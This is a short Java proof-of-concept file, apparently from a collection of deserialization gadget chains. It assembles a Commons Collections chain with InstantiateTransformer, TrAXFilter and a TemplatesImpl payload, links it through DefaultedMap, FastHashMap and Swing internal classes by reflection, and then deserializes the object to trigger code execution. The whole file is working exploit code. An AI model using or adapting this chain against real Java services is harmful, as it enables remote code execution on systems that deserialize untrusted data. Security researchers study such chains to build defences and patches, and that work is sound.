package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.DefaultedMap;

import javax.swing.event.SwingPropertyChangeSupport;
import javax.xml.transform.Templates;

public class POC_13 {

    /***
     * run with action_equals.jar
     */

    public static void main(String[] args) throws Exception {
        FastHashMap fhmap1 = new FastHashMap();
        fhmap1.put(TrAXFilter.class, "value1");

        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap("1");
        d.put("key2", "value2");

        ReflectionUtil.setField(d, "value", transformer);
        Object action = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.plaf.basic.BasicSliderUI$ActionScroller"));
        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{"key", fhmap1, "key", d};

        ReflectionUtil.setField(arrayTable, "table", table);
        SwingPropertyChangeSupport changeSupport = new SwingPropertyChangeSupport("bean");
        ReflectionUtil.setField(action, "arrayTable", arrayTable);
        ReflectionUtil.setField(action, "changeSupport", changeSupport);

        SerializeUtil.deserialize(SerializeUtil.serialize(action));
    }

}
